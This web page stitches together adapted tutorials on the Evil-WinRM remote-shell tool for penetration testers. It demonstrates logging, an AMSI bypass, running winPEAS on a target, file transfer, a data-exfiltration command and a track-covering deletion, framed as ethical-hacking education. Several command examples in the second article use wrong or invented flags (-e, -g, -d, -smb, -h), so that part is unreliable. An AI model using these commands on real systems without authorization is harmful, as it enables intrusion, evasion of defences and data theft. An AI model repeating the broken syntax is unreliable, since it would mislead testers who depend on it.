![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWrZ3OLHp37tUrBA1GeeWdfI9yKRIYWjgdTd23gGHkm2YZTE--ajyOiGA0R3QrZWGpIS7OM-hoB8a0SihgP07gVuqKN66OeVSzZhxF_-KbPffs2xuqscSeTiGPsOHn_vImPAqAY5t6ulX_x8kS80c-sJdqF9Y68SdE_8XVMogGGBNJKXHZFF6ojSE2dQ/s16000/8.png)

### Store logs with Evil-winrm

This feature is designed to save logs to our local system while performing enumeration after getting a remote session. When we are playing CTF or in the real-time internal penetration testing engagement, we need to keep references for the reporting. Evil-winrm gives that freedom to save all logs into our base machine using **-l** flag. We can take any remote session using evil-winrm and add -l flag so it will save all the logs to our base machine in **/root/evil-winrm-logs** directory with the date and IP address which can be used later for the references. In the below example, we have used the ipconfig command and the output of the command saved in our base machine at the same time.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -l

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgzXNJmLa5FndDX_XCvryqG8q5UJ7ByWxpF6Y7HdX1-pVOb6WhwE2nlMXYnjvu_uqQ_5043i7At05F9Ji3-C7sOLwIkd-LrcIbsh6VH9Le2AFRU9fohrLZBKyDdGDW9EdpMbhcFGIKdny9RtgCqHYVcuQNAJFlv82D7CLvvKPzxqJKSifRE_HM0GGBAzA/s16000/9.png)

We can verify it by checking the saved logs contents, you will notice it has captured the screenshot of the terminal where we used the ipconfig command.

**![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-4BJFw_cOHEE8Up8tKCaY45gwfPnDMMg9b4VImkwdLXIY3FGQpp3uAMtgb0AznA3udhmIc2Jhe25UanrRG-IFuNDpsxReO_9kube4Enh9H5jcrBeGf3qdr_QbifJtwOOOya3eD_wncMgTWOrtE-piTDqieteFDerPlTD2fLznDowzYoCktfsUaoaQWw/s16000/10.png)**

### Disable Remote Path Completion

By default, it comes with the remote path completion feature, but if we wish to disable remote path completion, we can add **-N** flag along with our command. It depends on individuals whether they prefer the auto-completion feature on or off but if you are comfortable with auto-completion then feel free to go with its default function.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -N

**![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQFof1y-dV4OjqHmgGanj8aajN2v6iBE8PaSDf96sKzEOEiEkIIt6YX_lA2285N2KYHetBh3RdLQgt-QI5eB7aEmyGclOQ7TE0QEX-YS6yLiGCB1Bk2pgGXk3EARQuhOS_kFU456wvkVFul4bvf9AocgudzW8U3lgJJVgQPaZtzslGDczhSTl6iOnB6A/s16000/11.png)**

### Disable Coloured Interface

Whenever we establish any remote session using evil-winrm, it spawns a beautiful, coloured command line interface. Still, if we wish to disable the coloured interface then we can also do that using **-n** flag along with our command while establishing a session.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -n

**![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTrglAX8xtQyv4KzCGUGA7N94rS9z2HsaQrXGE8-xie9nAJjeZ_XwxwGRD6b3deyauNtwI2iK6Wh-s5RZUmsLS7P-5MVhq5ZqMZun9XpQCNAceNdCfU_v82ewpIvTByBQ0l4MXWd-K5Lk51KTgBiZXyWRddm3dH8-u-kT_F98G7IJAF-2kPWnQKKM9LQ/s16000/12.png)**

### Run Executables File

This feature is designed to tackle real-time problems and difficulties we faced during the assessment when we have a PowerShell session, and we cannot drop it to the command line. In such scenarios, we wish if we could run exe executables in the evil-winrm sessions. Suppose we have an executable that we want to run in the target system.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimPtOZc3YmskOpn9kA3_DqkwHmYixL7oVPZn-71hX7rtpkLv65ZiQQ6TjqhHfggGXEe78MD4ZZQNIaaBhlZVOPeEEB_2pvxPD68cY42FP1PJ199KfdNmzZyvDLdcC8yq5PgXx2ZpY1ca4Q1OGesh5J9Ob0Asu_iVZbVRI08yArDZf2vK8bo_0FLtY1Dw/s16000/13.png)

 Hackplayers team designed this tool again and added an additional feature where we can run all executables like a charm while in the evil-winrm PowerShell session. Similarly, as we used -s flag to execute the PowerShell scripts path, this time we use **-e** flag to execute exe executable binaries. In the below example, we are issuing a path whereWinPEAS.exe executable is stored in the local machine and run it using an additional feature (**Invoke-Binary**) from the evil-winrm menu. This feature allows us to execute any exe binaries that usually run in the command line shell.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc

Bypass-4MSI

menu

Invoke-Binary /opt/privsc/winPEASx64.exe

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1HbFIHZrCdFDc-TospIBJBOOLl6Znt68mtLt7qbUJwwzleEEIqEbX_kEMQlXNmeMzzuW6AdvgGpFVzzfkBZq-SrWVpG8u9dsf2W9lzFUdeFRUnf1XUr5m-gER75GCw1GvIbsCUai31loYcc5-UVGoHigLXsu_54yN7o22vn6-IIb1YRotWYg4lZe4nw/s16000/14.png)

Once we set an executables path then we can use any executable that we wish to run into the target system. In the below example, we are calling WinPEASx64.exe and running it into the target system with evil-winrm. As we can see, it is working fine as expected.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfC1qx5x21vYOpemsV-aF4FfbiLy2cdlWuvZEktqduHu2qJxiu2CkeTK8hPomieCBzFzJQ6gcKLJ0YyQDvC-iWPNZkuCA76cB9shHSyZM3yQWhTRTKpIQGcr3iBV4rzMlJUE0xT248WaTROx0tiLujTy0u_CqYlwQAfP-ZAApP3eBM7CYE9I7wHNc8sA/s16000/15.png)

### Service Enumeration with Evil-winrm

Sometimes many post-exploitation enumeration tools fail to detect the service name that is running in the target system. In that scenario, we can use evil-winrm to find the service names running in the target system. To do that, we can again go to the menu and use services feature. It will list all the services running into the compromised host. This feature can be very handy when we see there is any unquoted service installed in the target system and other post-exploitation tools fail to identify the service name.

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_M5QqtZiEsNt67o-QiAo2h3vlSANXg63OMdj72Gy248b0uP-6JHDih9kIMuyILepwcg3NILL_28W30hhvE4apwgKUH6JkOZAmjIePuHr1MofdgdKyWG4ra3IxduvS7Jdwa2qKn2o9k7JsbSLRf26iHpmrmqhXZFvbXWbCU5G7Ef_CIhLGzUDN0xcHFA/s16000/16.png)

### File Transfer with Evil-winrm

There is no doubt that evil-winrm has given its best to make our work easy as possible. We always need to transfer files from the Attacking machine to the remote machine in order to perform enumeration or other things. Instead of setting the python server and downloading it from the target system, we can simply use the **upload** command with the filename. This is a life-saving feature that the evil-winrm tool is giving especially in such scenarios when we face outbound traffic rules set in the target system and when we are using evil-winrm with proxies. In the below example, we are uploading the **notes.txt** file in the target system.

upload /root/notes.txt .

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjV0LYXEelOEl_x-PT2bJaSLRp6fsu9Lnu2btIjge24KumeMLT-QE3ztsX9WmhfSRRW9KyCcnNZB4J-U6jsHQ88X25UiQY09UkbuG4ZjjEXVRkRDbzWwp3iLVQkANtFAnJg8FrM7TigEm10mVvOCTAGI5Qow43-wUW3Nvlr88OOgkQIFziAc5QAb44Yfg/s16000/17.png)

Similarly, we can download the file from the target system to the attacker’s machine using the **download** command along with the file name.

download notes.txt /root/raj/notes.txt

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXS3qvhGiUEKBFNhb7VJcRdIRYJx_Ls91JWqekyxzrjavIMCTSlEQP97glCymhu10zsX0gAf_HeFjxZJr47x9TmOHvXYeUeHm6MHazNsWtYBcimmlcDzF8t5GpDg_Z3OVshf2VfV3Y--kgqmwpHUE3RkHoct-tyD0BqYONh9KIH_yJnveguYHMHsJc-A/s16000/18.png)

We can verify it by navigating the path we downloaded notes.txt in the attacking machine.

**![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_7c1A6iq4Az8HYbs7Pk9WYmqRfYEUHGk585B2sHS3Hs_r-vNZe5fjXl4dEIBGnkVNpoo4vAyoDCu_WkC0vLiiTatAm1SkVN84I-yqMqvCtH14cE4NaDQstmW7ET0kk6tD46vjhSljL0gxvmKGWbTgRssDCh_6yypPDvw6579AlF-Q7wWKtbXmv76HiQ/s16000/19.png)  
**

### Use Evil-winrm From Docker

This tool also can be installed in the docker. If we have another system in the docker where evil-winrm is installed, then we can also call it from the docker. It will work the same as it was working in the main base system without any problem. To do that, follow the docker syntax along with the evil-winrm command to call it from the docker.

docker run --rm -ti --name evil-winrm oscarakaelvis/evil-winrm -i 192.168.1.105 -u Administrator -p 'Ignite@987'

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOIailYL9GKluzCKk-zrkspNoT3ogvCd6OGtYu7aITQpFZsrkXS-Utz9_89z2h1xufIoDwZiG4tbVKm7WX0Pvb4I7EMHc6Sieu5whgNO2oeRPI7cMsIuurqclUtETYXyziDimBMdfOv3zXfrJoUywKW9WjPxQNUqJxtA5vm4cPQAcLldupymseVgHNcg/s16000/20.png)

### Login with the key using Evil-winrm

Evil-winrm also allows us to use the public and private key to establish a remote session using the **-c** flag for the public key and the **-k** flag for the private key. In addition, we can also add **-an S** flag to enable SSL to make our connection encrypted and secure.

evil-winrm -i 10.129.227.105 -c certificate.pem -k priv-key.pem -S

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEizVJClp8gbrg8lp7DlPrz9aSIJVjvMxsbvtiS1gF81v5rn9ejrOotdZ2121ZW9HPlXvh4R1Uo8m-irhwCa4xzGi5Cc0ZGDjp2Y-SnGzkwj2AWkM74cm-OBs802lMz-TCaRJ7ajM-EedpXiqhAI0uSyRwpdtYYFNkxf706NPV-BRNDrC6K-Pbp4qk1pIQ/s16000/21.png)

### Conclusion

We have explored the Evil-winrm tool briefly and its special features which will go to make our Internal assessment much easier. We have explored multiple techniques to establish a remote session using evil-winrm. Also, we have explored some of its advanced features which will enhance our productivity in the production environment as well as in the CTFs. Lastly, I would like to thank Hackplayers for making such a great tool. I hope you have learned something new today. Happy hacking!

**Credit:** This information was adapted from an excellent guide on [HackingArticles.in](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/). Be sure to check out the original post for more details.

# Exploring Evil-WinRM: A Powerful Ethical Hacking Tool for Windows Environments

![](https://miro.medium.com/v2/resize:fit:700/0*-Wyv3jJJHPBcxXtv)

Introduction

In the world of ethical hacking and penetration testing, it’s essential to have a diverse set of tools at your disposal to assess the security of various systems and networks. Evil-WinRM is one such tool that has gained popularity among cybersecurity professionals for its effectiveness in Windows environment testing. This article will delve into the depths of Evil-WinRM, explaining its features, capabilities, and how ethical hackers can utilize it for the greater good.

Understanding Evil-WinRM

Evil-WinRM is an open-source, command-line-based tool that provides remote shell access to Windows machines over WinRM (Windows Remote Management). WinRM is a management protocol used to perform tasks on Windows-based systems remotely. Evil-WinRM leverages the weaknesses in WinRM to establish a foothold on a target system, allowing ethical hackers to perform various post-exploitation activities.

Key Features of Evil-WinRM

1. **Remote Command Execution:** Evil-WinRM enables ethical hackers to execute commands on a compromised Windows machine, just like a typical reverse shell. This is particularly useful for exploring the system, gathering information, and performing further attacks.
2. **Interactive Shell:** It provides an interactive shell, giving ethical hackers full control over the target system, including the ability to browse files, install backdoors, and manipulate system settings.
3. **File Upload/Download:** Users can upload and download files between the attacker’s machine and the compromised Windows host, making data exfiltration and infiltration easier.
4. **Scripting Support:** Evil-WinRM supports scripting, allowing hackers to automate tasks and execute scripts on the target machine. This is valuable for post-exploitation activities.
5. **HTTPS and HTTP Support:** It can be configured to use both HTTPS and HTTP for communication, offering flexibility and better security options.

Ethical Hacking Use Cases

1. **Post-Exploitation:** After gaining initial access to a Windows machine, ethical hackers can utilize Evil-WinRM to further explore the system, collect sensitive information, and maintain persistence.
2. **Privilege Escalation:** The tool can be used to check for and exploit vulnerabilities that could lead to privilege escalation on the target system.
3. **Lateral Movement:** Ethical hackers can pivot between compromised Windows hosts, exploring the network’s inner layers and identifying potential targets for further exploitation.
4. **Data Exfiltration and Infiltration:** Evil-WinRM allows for easy data transfer, making it a valuable tool for retrieving sensitive data or planting malicious files on the target system.

Here are some common commands and examples of how to use Evil-WinRM in ethical hacking:

1. **Basic Connection:**

- To establish a connection with a remote Windows machine:
- `evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD>`
- **Command Execution:**
- Execute a command on the compromised host:
- `evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -e "command to execute"`
- **Interactive Shell:**
- Get an interactive shell on the target system:
- `evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD>`
- **File Upload and Download:**
- Upload a file to the compromised host:

evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -s "source_file" -d "destination_directory"

- Download a file from the compromised host
- `evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -g "source_file" -d "destination_directory"`
- **Script Execution:**
- Execute a PowerShell script on the target system:
- `evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -s "powershell_script.ps1"`
- **Privilege Escalation:**
- Check for local privilege escalation vulnerabilities (requires access to the target system):
- `whoami /priv`
- **Lateral Movement:**
- Use Evil-WinRM to pivot to another host within the same network:
- `evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -smb <TARGET_IP> -h <HASH>`
- **Data Exfiltration:**
- Compress and exfiltrate sensitive data:
- `Compress-Archive -Path "data_directory" -DestinationPath "exfiltrated_data.zip" evil-winrm -i <IP_ADDRESS> -u <USERNAME> -p <PASSWORD> -g "exfiltrated_data.zip" -d "destination_directory"`
- **Cleanup and Cover Tracks:**
- Remove traces of your presence:
- `del /f /q "malicious_file.exe"`

Always remember to use these commands responsibly and with the appropriate permissions and authorization. Unauthorized or malicious use of such commands can have severe legal consequences. Ethical hacking should be conducted following the law and ethical guidelines.

Using Evil-WinRM Responsibly

While Evil-WinRM is a powerful tool for ethical hacking and penetration testing, it is important to emphasize that its use must adhere to ethical guidelines and legal regulations. Always ensure that you have proper authorization to test or assess a system, and never engage in any activities that could harm the target system or compromise the privacy and security of individuals or organizations.

Conclusion

Evil-WinRM is a versatile and effective tool for ethical hackers when it comes to assessing Windows environments. Its features and capabilities make it a valuable asset in a penetration tester’s toolkit. However, it is crucial to use this tool responsibly and within the boundaries of ethical hacking, adhering to legal and ethical standards.

As the cybersecurity landscape continues to evolve, tools like Evil-WinRM are essential for ensuring the security of Windows systems, both in organizations and on a broader scale. When used in the right context and with the proper authorization, Evil-WinRM empowers ethical hackers to identify vulnerabilities, strengthen security, and ultimately make the digital world a safer place.

**Disclaimer**: This guide is for educational purposes only. Always ensure you have proper authorization before conducting any security testing on systems or networks you do not own or have explicit permission to test.

If you’re curious to learn more about cybersecurity and ethical hacking, be sure to follow [@S3Curiosity](https://twitter.com/S3Curiosity) on Twitter for regular updates and insights. You can also explore practical demonstrations and code samples on the topic by visiting [S3Curiosity’s GitHub page](https://github.com/S3Curiosity).

**Credit:** This information was adapted from an excellent guide on [Medium](https://medium.com/@S3Curiosity/exploring-evil-winrm-a-powerful-ethical-hacking-tool-for-windows-environments-21918b56f18a). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/EWJM3tERMXs?si=6lDPBVGjaeFwfAs7" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=EWJM3tERMXs). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/ZVr7T80fkdA?si=m_u5ns4LPzW84HYh" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=ZVr7T80fkdA). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/tVgJ-9FJKxE?si=hePHpJAU75i4lYmu" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=tVgJ-9FJKxE&t=1046s). Be sure to check out the original post for more details.

